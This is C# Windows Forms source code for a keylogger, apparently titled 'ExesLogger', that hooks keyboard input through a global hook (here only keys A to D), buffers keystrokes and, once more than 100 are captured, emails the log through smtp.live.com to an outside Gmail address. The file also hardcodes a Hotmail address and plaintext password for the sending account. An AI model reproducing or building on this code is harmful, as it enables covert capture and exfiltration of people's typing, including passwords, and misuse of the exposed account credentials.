using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ExesLanding;
using System.Net.Mail;

namespace logger
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            Listen();
        }
        globalKeyboardHook klavye = new globalKeyboardHook();

        void Listen()
        {//dinleyeceğin tüm tuşları buraya yaz.
           
            klavye.HookedKeys.Add(Keys.A);
            klavye.HookedKeys.Add(Keys.B);
            klavye.HookedKeys.Add(Keys.C);
            klavye.HookedKeys.Add(Keys.D);

            klavye.KeyDown += new KeyEventHandler(TusKombinasyonu);
        }

        string log;
        int length = 0;
        private void TusKombinasyonu(object sender,KeyEventArgs e)
        {
            log += e.KeyCode;
            length++;
        }

        private void Form1_Click(object sender, EventArgs e)
        {
            MessageBox.Show(log + " " +length);
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (length>100)
            {
                timer1.Stop();

                SendMail();

                log = string.Empty;
                length = 0;
            }
        }

        void SendMail()
        {     

            SmtpClient smtpClient = new SmtpClient("smtp.live.com");
            var mail = new MailMessage();
            mail.From = new MailAddress("crazy_crazy.46@hotmail.com");
            mail.To.Add("bkztrk@gmail.com");
            mail.Subject = "ExesLogger";
            mail.IsBodyHtml = true;
            mail.Body = log;
            //string htmlBody;
            //htmlBody = "Write some HTML code here";
            //mail.Body = htmlBody;
            smtpClient.Port = 587;
            smtpClient.UseDefaultCredentials = false;
            smtpClient.Credentials = new System.Net.NetworkCredential("crazy_crazy.46@hotmail.com", "297232100889a");
            smtpClient.EnableSsl = true;
            smtpClient.Send(mail);



        }
    }
}
